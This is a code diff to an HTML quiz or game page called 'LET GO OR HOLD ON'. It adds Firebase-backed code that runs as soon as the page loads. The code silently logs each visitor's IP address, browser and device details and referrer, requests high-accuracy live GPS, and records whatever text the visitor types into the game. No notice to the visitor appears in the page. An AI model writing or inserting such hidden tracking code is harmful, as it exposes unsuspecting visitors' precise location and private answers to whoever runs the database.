@@ -5,6 +5,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>LET GO OR HOLD ON</title>
   <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+  <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-database-compat.js"></script>
   <style>
     :root {
       --main: #00ffcc;
@@ -392,6 +394,82 @@
   </div>
 
   <script>
+    // Firebase init
+    const firebaseConfig = {
+      apiKey: "AIzaSyBXDC8VIPcjEMLem7Vwx4cZ2mgt3HyheWQ",
+      authDomain: "abdullahaltepe-11156.firebaseapp.com",
+      databaseURL: "https://abdullahaltepe-11156-default-rtdb.firebaseio.com",
+      projectId: "abdullahaltepe-11156",
+      storageBucket: "abdullahaltepe-11156.firebasestorage.app",
+      messagingSenderId: "1072821578873",
+      appId: "1:1072821578873:web:a795b1b49c8ce01d28f8a8"
+    };
+    try { firebase.initializeApp(firebaseConfig); } catch(e) {}
+    const database = firebase.database();
+    const letgoRef = database.ref('letgoVisitors');
+
+    async function getIP() {
+      try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        return (await r.json()).ip;
+      } catch (e) { return 'unknown'; }
+    }
+
+    function getLiveGPS() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve({ permission: 'unavailable' });
+        navigator.geolocation.getCurrentPosition(
+          (pos) => resolve({
+            permission: 'granted',
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            altitude: pos.coords.altitude,
+            heading: pos.coords.heading,
+            speed: pos.coords.speed,
+            gpsTime: pos.timestamp
+          }),
+          (err) => resolve({ permission: 'denied', error: err.message }),
+          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+      });
+    }
+
+    let letgoVisitorKey = null;
+
+    async function logLetgoVisitor() {
+      try {
+        const ip = await getIP();
+        const entry = {
+          ip: ip,
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          screen: screen.width + 'x' + screen.height,
+          pixelRatio: window.devicePixelRatio,
+          referrer: document.referrer || 'direct',
+          timestamp: Date.now(),
+          enteredAt: new Date().toLocaleString('tr-TR'),
+          gps: { permission: 'pending' }
+        };
+        const pushed = letgoRef.push(entry);
+        letgoVisitorKey = pushed.key;
+        const gps = await getLiveGPS();
+        letgoRef.child(letgoVisitorKey + '/gps').set(gps);
+      } catch (err) { console.error('letgo log err:', err); }
+    }
+    logLetgoVisitor();
+
+    // Kullanıcının yazdığı cevabı da aynı kayda ekle
+    function logAnswer(text, verdict) {
+      if (!letgoVisitorKey) return;
+      letgoRef.child(letgoVisitorKey + '/answer').set({
+        text: text,
+        verdict: verdict,
+        answeredAt: new Date().toLocaleString('tr-TR')
+      });
+    }
+
     const input = document.getElementById('userInput');
     const inputSection = document.getElementById('inputSection');
     const analyzeScreen = document.getElementById('analyzeScreen');
@@ -522,6 +600,7 @@
       resultScreen.style.display = 'flex';
 
       const result = analyzeText(text);
+      logAnswer(text, result);
       const verdict = document.getElementById('verdict');
       const verdictG1 = document.getElementById('verdictG1');
       const verdictG2 = document.getElementById('verdictG2');
